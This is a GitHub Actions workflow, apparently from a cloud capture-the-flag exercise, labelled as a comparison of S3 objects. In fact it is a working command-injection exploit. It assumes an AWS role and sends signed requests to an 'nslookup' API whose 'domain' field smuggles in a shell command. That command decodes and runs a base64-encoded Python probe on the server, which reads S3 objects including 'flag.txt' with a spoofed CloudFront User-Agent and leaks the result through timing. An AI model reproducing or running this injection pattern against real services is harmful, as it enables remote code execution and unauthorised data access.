name: Stage2-Compare-S3-Objects

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  compare:
    runs-on: ubuntu-latest

    steps:
      - name: Configure AWS
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Compare S3 endpoints and objects
        shell: bash
        run: |
          set +e

          python3 -m pip install boto3 requests requests-aws4auth --quiet

          python3 - <<'PY'
          import base64
          import shlex
          import time
          import requests
          import boto3
          from requests_aws4auth import AWS4Auth

          API = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
          UA = "Amazon CloudFront"

          targets = [
              (
                  "path_index",
                  "https://s3.us-east-1.amazonaws.com/userad88e2b168aa387e/index.html"
              ),
              (
                  "path_flag",
                  "https://s3.us-east-1.amazonaws.com/userad88e2b168aa387e/flag.txt"
              ),
              (
                  "virtual_index",
                  "https://userad88e2b168aa387e.s3.us-east-1.amazonaws.com/index.html"
              ),
              (
                  "virtual_flag",
                  "https://userad88e2b168aa387e.s3.us-east-1.amazonaws.com/flag.txt"
              )
          ]

          inner = r'''
          import sys
          import time
          import urllib.request

          url = sys.argv[1]
          ua = sys.argv[2]

          try:
              request = urllib.request.Request(
                  url,
                  headers={"User-Agent": ua}
              )

              with urllib.request.urlopen(request, timeout=10) as response:
                  data = response.read()

              print("READ_OK")
              print("BYTES=" + str(len(data)))
              time.sleep(4)

          except Exception as error:
              print("READ_FAIL")
              print(repr(error))
          '''

          encoded = base64.b64encode(inner.encode()).decode()

          credentials = boto3.Session().get_credentials().get_frozen_credentials()

          auth = AWS4Auth(
              credentials.access_key,
              credentials.secret_key,
              "us-east-1",
              "execute-api",
              session_token=credentials.token
          )

          for name, target in targets:
              command = (
                  "example.com; "
                  "printf '%s' "
                  + shlex.quote(encoded)
                  + " | base64 -d > /tmp/object_probe.py; "
                  + "python3 /tmp/object_probe.py "
                  + shlex.quote(target)
                  + " "
                  + shlex.quote(UA)
                  + "; #"
              )

              started = time.monotonic()

              try:
                  response = requests.post(
                      API,
                      json={"domain": command},
                      auth=auth,
                      timeout=20
                  )

                  elapsed = time.monotonic() - started

                  print("TARGET=" + name)
                  print("HTTP=" + str(response.status_code))
                  print("ELAPSED=%.2f" % elapsed)
                  print("---")

              except Exception as error:
                  elapsed = time.monotonic() - started
                  print("TARGET=" + name)
                  print("ERROR=" + repr(error))
                  print("ELAPSED=%.2f" % elapsed)
                  print("---")
          PY
